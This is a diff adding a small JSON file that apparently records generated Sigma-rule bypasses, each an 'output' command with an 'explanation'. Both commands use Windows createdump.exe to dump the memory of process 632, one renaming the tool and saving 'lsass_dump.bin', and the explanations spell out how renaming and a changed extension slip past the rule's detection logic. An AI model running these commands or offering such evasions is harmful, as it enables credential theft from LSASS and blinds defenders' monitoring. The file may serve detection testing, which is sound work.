@@ -1,0 +1,10 @@
+[
+  {
+    "output": "copy C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\createdump.exe C:\\Temp\\not_a_dump.exe && C:\\Temp\\not_a_dump.exe --full --name /tmp/lsass_dump.bin 632",
+    "explanation": "The Sigma rule triggers if the OriginalFileName is 'FX_VER_INTERNALNAME_STR' OR if specific CLI flags (--full/--name) are used, UNLESS the executable name is exactly 'createdump.exe'. By renaming the utility to 'not_a_dump.exe' and changing the output extension from '.dmp' to '.bin', both selection_cli (which looks for '.dmp') and the filter (which expects the original filename) are bypassed."
+  },
+  {
+    "output": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\createdump.exe -f /tmp/test.dmp -u 632",
+    "explanation": "This demonstrates that if the utility is NOT renamed (keeping the name 'createdump.exe'), the 'filter' block in the Sigma rule explicitly excludes it from detection. The rule is specifically designed to find renamed instances; therefore, using the original filename with the suspicious flags is a logical bypass of this specific detection logic."
+  }
+]
